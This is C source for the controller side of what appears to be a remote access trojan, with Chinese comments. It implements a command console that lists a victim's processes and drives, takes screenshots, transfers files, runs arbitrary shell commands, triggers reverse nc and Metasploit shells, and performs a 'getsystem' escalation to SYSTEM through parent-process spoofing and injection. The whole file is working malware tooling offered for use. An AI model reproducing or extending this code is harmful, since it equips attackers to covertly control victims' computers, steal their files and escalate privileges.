#include "command.h"

// 获取时间戳
void GetTimestamp(char str[])
{
	time_t now;
	time(&now);
	_itoa_s((int)now, str, 25, 10);
}

// 帮助菜单
BOOL Help(char cmd[])
{
	// 是否执行help命令
	if (_strnicmp(cmd, "help", 4) != 0)
		return FALSE;

	printf("\n");
	printf("命令\t\t描述\n");
	printf("-------\t\t-----------\n");
	printf("help\t\t帮助信息\n");
	printf("ps\t\t列出正在运行的进程\n");
	printf("getpid\t\t获取当前进程pid\n");
	printf("drive\t\t列出盘符\n");
	printf("download\t下载文件\n");
	printf("upload\t\t上传文件\n");
	printf("screen\t\t屏幕截图\n");
	printf("nc\t\t反弹nc\n");
	printf("msf\t\t反弹msf\n");
	printf("getsystem\t尝试提权到system\n");

	return TRUE;
}

// 上传文件
// 执行upload命令 返回TRUE 否则FALSE
BOOL Upload(SOCKET sServer, char cmd[])
{
	// 是否执行upload命令
	if (_strnicmp(cmd, "upload", 6) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	// 获取文件名
	memcpy(file, cmd + 7, strlen(cmd) - 7);
	printf("upload %s\n", file);

	FILE* fp;
	errno_t err;
	err = fopen_s(&fp, file, "rb");
	// 文件不存在
	if (err != 0 || fp == NULL)
	{
		printf("file doesn't exist\n");
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 发送文件名
	SendData(sServer, file, sizeof(file));

	// 获取文件大小
	fseek(fp, 0, SEEK_END);
	int fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	printf("send file size is %d bytes\n", fileSize);
	// 发送文件大小
	SendData(sServer, (char*)&fileSize, sizeof(fileSize));

	if (IsRecvError(sServer))
	{
		printf("can't open file path\n");
		return TRUE;
	}

	// 发送文件内容
	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));

	int size;
	while (!feof(fp))
	{
		size = fread(buffer, 1, sizeof(buffer), fp);
		send(sServer, buffer, size, 0);
	}

	Sleep(1000);
	fclose(fp);
	SendData(sServer, "over", 5);
	printf("send file over\n");

	// 获取对方文件路径
	RecvData(sServer, buffer, sizeof(buffer));
	printf("upload to %s\n", buffer);
	return TRUE;
}

// 下载文件
// 执行download命令 返回TRUE 否则 FALSE
BOOL Download(SOCKET sServer, char cmd[])
{
	// 是否执行download命令
	if (_strnicmp(cmd, "download", 8) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));

	if (IsRecvError(sServer))
	{
		printf("file doesn't exist\n");
		return TRUE;
	}

	// 获取文件名
	RecvData(sServer, file, sizeof(file));

	int fileSize;
	// 获取文件大小
	RecvData(sServer, (char*)&fileSize, sizeof(fileSize));
	printf("recv file size is %d bytes\n", fileSize);

	// 获取当前路径
	char path[255] = { 0 };
	ZeroMemory(path, sizeof(path));
	getcwd(path, 255);

	// 文件后缀名
	char* extension = strrchr(file, '.');

	// 获取时间戳
	char time[25];
	GetTimestamp(time);

	// 保存文件路径
	strcat_s(path, 255, "\\");
	strcat_s(path, 255, time);
	strcat_s(path, 255, extension);

	FILE* fp = fopen(path, "wb");
	char buffer[256];
	if (fp == NULL || fp == 0)
	{
		printf("can't open file path\n");
		// 发送错误信息给对方
		SendError(sServer);
		return TRUE;
	}

	// 告诉对方可以进行文件传输了
	SendSuccess(sServer);

	// 接收文件内容
	printf("download %s\n", file);
	while (TRUE)
	{
		int size = recv(sServer, buffer, sizeof(buffer), 0);
		if (size == 0 || strcmp(buffer, "over") == 0)
			break;

		// 写入文件
		fwrite(buffer, 1, size, fp);
	}

	fclose(fp);
	printf("save file to %s\n", path);
	return TRUE;
}

// 切换路径
BOOL ChangePath(char cmd[])
{
	// 是否执行cd命令
	if (_strnicmp(cmd, "cd", 2) != 0)
		return FALSE;

	return TRUE;
}

// 截屏命令
BOOL Screen(SOCKET sServer, char cmd[])
{
	// 是否执行screen命令
	if (_strnicmp(cmd, "screen", 6) != 0)
		return FALSE;

	if (IsRecvError(sServer))
	{
		printf("fail to screen\n");
		return TRUE;
	}

	char buffer[255] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	// 接收客户端截屏信息
	RecvData(sServer, buffer, sizeof(buffer));
	
	// 下载图片
	char downloadCmd[255] = { 0 };
	ZeroMemory(downloadCmd, 0);
	strcat_s(downloadCmd, 255, "download ");
	strcat_s(downloadCmd, 255, buffer);
	Download(sServer, downloadCmd);
	return TRUE;
}

// 查看进程信息命令
BOOL PS(SOCKET sServer, char cmd[])
{
	// 是否执行ps命令
	if (_strnicmp(cmd, "ps", 2) != 0)
		return FALSE;

	// 获取进程信息失败
	if (IsRecvError(sServer))
	{
		printf("fail to exec ps\n");
		return TRUE;
	}

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	// 接收进程数
	RecvData(sServer, buffer, sizeof(buffer));

	printf("\n");
	printf("Process List\n");
	printf("============\n");
	printf("\n");

	printf("%-16s%-40s%-16s%s\n", "PID", "Name", "Arch", "User");
	printf("%-16s%-40s%-16s%s\n", "---", "----", "----", "----");

	// 进程数
	int processCnt = atoi(buffer);
	// 输出进程信息
	for (int i = 0; i < processCnt; i++)
	{
		// 接收pid
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-8s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// 接收进程名
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-35s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// 接收位数
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%-8s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		// 接收域名\用户名
		RecvData(sServer, buffer, sizeof(buffer));
		printf("%s\t", buffer);
		ZeroMemory(buffer, sizeof(buffer));

		printf("\n");
	}
	return TRUE;
}

// 反弹NC
BOOL NC(SOCKET sServer, char cmd[])
{
	// 是否执行nc命令
	if (_strnicmp(cmd, "nc ", 3) != 0)
		return FALSE;

	// nc格式有误 或者 反弹nc失败
	if (IsRecvError(sServer) || IsRecvError(sServer))
	{
		printf("fail to reverse nc\n");
		return TRUE;
	}

	printf("success reverse nc\n");
	return TRUE;
}

// 磁盘命令
BOOL Drive(SOCKET sServer, char cmd[])
{
	// 是否执行drive命令
	if (_strnicmp(cmd, "drive", 5) != 0)
		return FALSE;

	RecvCmdResult(sServer);
	return TRUE;
}

// 反弹msf
BOOL MSF(SOCKET sServer, char cmd[])
{
	// 是否执行msf命令
	if (_strnicmp(cmd, "msf ", 4) != 0)
		return FALSE;

	// 错误msf格式 或者 msf连接失败
	for (int i = 0; i < 8; i++)
	{
		if (IsRecvError(sServer))
		{
			printf("fail to reverse msf\n");
			return TRUE;
		}
	}

	printf("success reverse msf\n");
	return TRUE;
}

// 提权 管理员提权到system
BOOL GetSystem(SOCKET sServer, char cmd[])
{
	// 是否执行getsystem命令
	if (_strnicmp(cmd, "getsystem", 9) != 0)
		return FALSE;

	// 没有管理员权限
	if (IsRecvError(sServer))
	{
		printf("current user is not an administrator\n");
		return TRUE;
	}

	// 获取进程列表失败
	if (IsRecvError(sServer))
	{
		printf("getsystem fail\n");
		return TRUE;
	}
	

	/* 启动一个新的server.exe来接收数据 */

	// 父进程欺骗成功 发送一个正常的端口
	// 父进程欺骗失败 发送"error"
	
	// 接收端口
	char port[20] = { 0 };
	ZeroMemory(port, sizeof(port));
	RecvData(sServer, port, sizeof(port));

	// 欺骗失败
	if (strcmp(port,"error") == 0)
	{
		printf("getsystem fail\n");
		return TRUE;
	}


	// 获取server.exe 完整路径
	TCHAR tempPath[MAX_PATH];
	GetModuleFileName(NULL, tempPath, MAX_PATH);
	// 转换成char *格式
	char currentPath[MAX_PATH] = { 0 };
	TcharToStr(tempPath, currentPath);

	// 进行命令的拼接
	char cmdLine[MAX_PATH] = {0};
	ZeroMemory(cmdLine, sizeof(cmdLine));
	strcat(cmdLine, "\"");
	strcat(cmdLine, currentPath);
	strcat(cmdLine, "\" ");
	strcat(cmdLine, port);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = {0};

	// 填充置0
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	// 启动Server.exe失败
	if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOA)&si, &pi))
	{
		printf("exec Server.exe fail\n");
		SendError(sServer);
		return TRUE;
	}

	// 等待1秒钟 让Server.exe先启动起来
	Sleep(1000);
	// 可以进行新通信了
	SendSuccess(sServer);
	printf("getsystem sucess\n");
	// 关闭句柄
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	
	// 双方都能正常启动,接收最后的信息
	char buffer[20] = {0};
	RecvData(sServer, buffer, sizeof(buffer));
	printf("injection to %s\n", buffer);
	return TRUE;
}

// 获取pid
BOOL GetPID(SOCKET sServer, char cmd[])
{
	// 是否执行getpid命令
	if (_strnicmp(cmd, "getpid", 6) != 0)
		return FALSE;

	char buffer[10] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	RecvData(sServer, buffer, sizeof(buffer));
	printf("PID:%s\n", buffer);
	return TRUE;
}

// 执行命令
void ExecCmd(SOCKET sServer, char cmd[])
{
	// 帮助命令
	if (Help(cmd))
		return;

	// 获取pid
	if (GetPID(sServer, cmd))
		return;

	// 提权成system
	if (GetSystem(sServer, cmd))
		return;

	// 反弹MSF
	if (MSF(sServer, cmd))
		return;

	// 反弹NC
	if (NC(sServer, cmd))
		return;

	// 查看进程
	if (PS(sServer, cmd))
		return;

	// 屏幕截图
	if (Screen(sServer, cmd))
		return;

	// 执行文件上传
	if (Upload(sServer, cmd))
		return;

	// 执行文件下载
	if (Download(sServer, cmd))
		return;

	// 执行cd命令
	if (ChangePath(cmd))
		return;

	// 执行cmd命令
	RecvCmdResult(sServer);
}

// 接收cmd命令执行后的结果
void RecvCmdResult(SOCKET sServer)
{
	if (IsRecvError(sServer))
	{
		printf("fail to exec\n");
		return;
	}

	// 死循环接收数据
	while (TRUE)
	{
		// 接收数据
		char buffer[1024];
		ZeroMemory(buffer, sizeof(buffer));
		RecvData(sServer, buffer, sizeof(buffer));

		// 命令接收完毕
		if (strcmp(buffer, "SendOver") == 0)
		{
			break;
		}
		// 输出得到的命令
		printf("%s", buffer);
	}
}

// 获取路径
void RecvPath(SOCKET sServer)
{
	char path[255] = { 0 };
	RecvData(sServer, path, sizeof(path));
	printf("%s\n", path);

}

// TCHAR转CHAR *
void TcharToStr(const TCHAR* tchar, char* _char)
{
	int iLength;
	//获取字节长度   
	iLength = WideCharToMultiByte(CP_ACP, 0, tchar, -1, NULL, 0, NULL, NULL);
	//将tchar值赋给_char    
	WideCharToMultiByte(CP_ACP, 0, tchar, -1, _char, iLength, NULL, NULL);
}